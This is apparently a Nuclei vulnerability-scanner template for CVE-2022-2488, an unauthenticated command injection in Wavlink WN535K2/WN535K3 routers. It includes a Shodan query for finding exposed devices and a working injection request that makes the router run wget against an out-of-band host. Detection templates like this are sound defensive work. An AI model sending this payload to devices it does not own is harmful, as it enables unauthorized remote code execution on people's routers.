id: CVE-2022-2488
info:
  name: Wavlink WN535K2/WN535K3 - OS Command Injection
  author: For3stCo1d
  severity: critical
  description: The Wavlink WN535K2 and WN535K3 routers are vulnerable to an OS command
    injection attack through manipulation of the IP argument, allowing an attacker
    to gain unauthorized access and control without credentials.
  reference:
  - https://github.com/1angx/webray.com.cn/blob/main/Wavlink/Wavlink%20touchlist_sync.cgi.md
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2488
  - https://vuldb.com/?id.204539
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2488
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-2488
    cwe-id: CWE-78
  metadata:
    shodan-query: http.title:"Wi-Fi APP Login"
    verified: 'true'
    impact: The OS command injection vulnerability in Wavlink WN535K2/WN535K3 routers
      can have a severe impact on compromised systems, allowing attackers to execute
      unauthorized commands, steal data or gain complete control without authentication.
    recommendation: It is highly recommended to keep Wavlink WN535K2 and WN535K3 routers
      updated with the latest firmware to mitigate the risk of OS command injection
      attacks via /cgi-bin/touchlist_sync.cgi.
  tags: cve,cve2022,iot,wavlink,router,rce,oast
requests:
- raw:
  - 'GET /cgi-bin/touchlist_sync.cgi?IP=;wget+http://{{interactsh-url}}; HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 500
